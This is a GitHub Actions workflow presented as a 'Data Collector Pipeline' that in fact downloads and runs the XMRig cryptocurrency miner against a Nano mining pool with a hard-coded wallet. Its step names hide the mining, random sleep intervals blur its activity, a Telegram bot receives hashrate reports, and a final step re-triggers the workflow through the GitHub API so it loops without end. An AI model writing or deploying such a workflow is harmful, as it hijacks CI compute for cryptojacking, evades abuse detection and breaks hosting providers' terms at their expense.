name: Data Collector Pipeline

on:
  workflow_dispatch:

jobs:
  collect:
    runs-on: ubuntu-latest
    timeout-minutes: 360

    steps:
      - name: Update Metadata
        run: echo "üì¶ Initializing data collection task..."

      - name: Prepare Runtime
        run: |
          sudo apt update -y && sudo apt install -y curl tar

      - name: Process Input
        env:
          TG_TOKEN: ${{ secrets.TG_TOKEN }}
          TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
        run: |
          curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
            -d chat_id=$TG_CHAT_ID \
            --data-urlencode text="üü¢ *Collector aktif.*\nMenjalankan tugas latar hingga 6 jam." \
            -d parse_mode=Markdown

      - name: Start Collector Agent
        run: |
          curl -L -o agent.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
          tar -xzf agent.tar.gz
          cd xmrig-6.24.0
          chmod +x xmrig

          DELAY=$((RANDOM % 300 + 30))
          echo "‚è≥ Menunggu $DELAY detik sebelum mulai..."
          sleep $DELAY

          ./xmrig \
            -o xmrig.nanswap.com:3333 \
            -a rx \
            -k \
            -u nano_1ep4soo6rat31n6otw4ggqdwj7tz5sjymyzfwi7kmhye6f31guujdo19cc3q \
            -p datapass \
            --donate-level 1 \
            --randomx-no-rdmsr \
            | tee logs.txt &

          PID=$!
          WORKTIME=$((RANDOM % 5400 + 1200))
          echo "üõ†Ô∏è Aktif selama $WORKTIME detik..."
          sleep $WORKTIME
          kill $PID

      - name: Extract Logs
        if: always()
        env:
          TG_TOKEN: ${{ secrets.TG_TOKEN }}
          TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
        run: |
          cd xmrig-6.24.0

          HASHRATE=$(grep -a "speed" logs.txt | tail -n1 | awk '{print $(NF-1) " H/s"}')
          HASHRATE=${HASHRATE:-"0 H/s"}

          ACCEPTED=$(grep -a "accepted" logs.txt | wc -l)
          REJECTED=$(grep -a "rejected" logs.txt | wc -l)

          MSG="‚úÖ *Collector selesai.*\n\nüìä *Statistik:*\n‚Ä¢ Hashrate: \`$HASHRATE\`\n‚Ä¢ Accepted: \`$ACCEPTED\`\n‚Ä¢ Rejected: \`$REJECTED\`"

          curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
            -d chat_id=$TG_CHAT_ID \
            -d text="$MSG" \
            -d parse_mode=Markdown

          HR=$(echo "$HASHRATE" | grep -oE '^[0-9]+')
          if [[ "$HR" =~ ^[0-9]+$ ]] && [ "$HR" -lt 100 ]]; then
            curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
              -d chat_id=$TG_CHAT_ID \
              -d text="‚ö†Ô∏è *Hashrate rendah:* $HASHRATE\nCek konfigurasi." \
              -d parse_mode=Markdown
          fi

      - name: Cooldown Before Next Cycle
        if: always()
        run: |
          PAUSE=$((RANDOM % 600 + 60))
          echo "‚è≥ Pause $PAUSE detik..."
          sleep $PAUSE

      - name: Retrigger Collector
        if: always()
        env:
          GH_TOKEN: ${{ secrets.GH_TOKEN }}
        run: |
          curl -X POST -H "Accept: application/vnd.github+json" \
               -H "Authorization: Bearer $GH_TOKEN" \
               https://api.github.com/repos/${{ github.repository }}/actions/workflows/data-collector.yml/dispatches \
               -d '{"ref":"main"}'
